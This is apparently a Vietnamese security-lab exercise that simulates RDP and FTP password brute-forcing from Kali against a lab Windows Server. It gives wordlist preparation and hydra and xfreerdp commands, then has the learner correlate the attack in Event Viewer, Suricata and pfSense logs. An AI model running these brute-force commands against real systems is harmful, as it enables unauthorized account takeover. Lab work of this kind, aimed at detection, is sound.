# 04 — Credential Brute-Force (RDP / FTP)

## Mục tiêu
Mô phỏng tấn công dò mật khẩu qua RDP và FTP, đối chiếu log giữa 3 nguồn: Suricata (tầng mạng), Windows Event Viewer (tầng hệ thống), pfSense Firewall log (tầng NAT).

## Điều kiện tiên quyết
- RDP đã bật trên WinServer2012 (Allow remote connections), NLA có thể tạm tắt để dễ demo
- Audit Policy đã bật: Logon (Success + Failure), Account Lockout (Success)
- Security log đã tăng size (196608 KB, Overwrite as needed)
- FTP Service đã cài trên IIS, cho phép Basic Auth + Anonymous

## Chuẩn bị wordlist (trên Kali)

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # nếu chưa giải nén
head -n 500 /usr/share/wordlists/rockyou.txt > /tmp/lab_pass.txt
echo "MatKhauThatCuaWinServer" >> /tmp/lab_pass.txt   # thay đúng mật khẩu demo đã đặt trên WinServer
```

## Các bước thực hiện

```bash
# Brute-force RDP
hydra -l administrator -P /tmp/lab_pass.txt -t 4 -V -f rdp://192.168.10.1

# Brute-force FTP
hydra -l administrator -P /tmp/lab_pass.txt -t 4 -V -f ftp://192.168.10.1

# Test đăng nhập tay để xác nhận (dùng xfreerdp)
xfreerdp /u:administrator /p:'MatKhauThatCuaWinServer' /v:192.168.10.1 /cert:ignore
```

## Bằng chứng cần thu thập

| File | Nội dung |
|---|---|
| `screenshots/04-hydra-terminal-output.png` | Terminal Hydra đang chạy |
| `screenshots/04-eventviewer-4625-failures.png` | Event Viewer — chuỗi Event ID 4625 (Logon Failure) |
| `screenshots/04-eventviewer-4624-success.png` | Event Viewer — Event ID 4624 (Logon Success) khi dò trúng |
| `screenshots/04-suricata-rdp-response.png` | ET INFO RDP - Response To External Host |

## Kết quả mong đợi
- Event Viewer ghi nhận hàng loạt 4625 liên tiếp, kết thúc bằng 1 dòng 4624 đúng thời điểm Hydra dò trúng mật khẩu đã chèn.
- Trường "Source Network Address" trong Event 4625/4624 khớp đúng IP Kali (192.168.10.50), xác nhận nguồn tấn công.
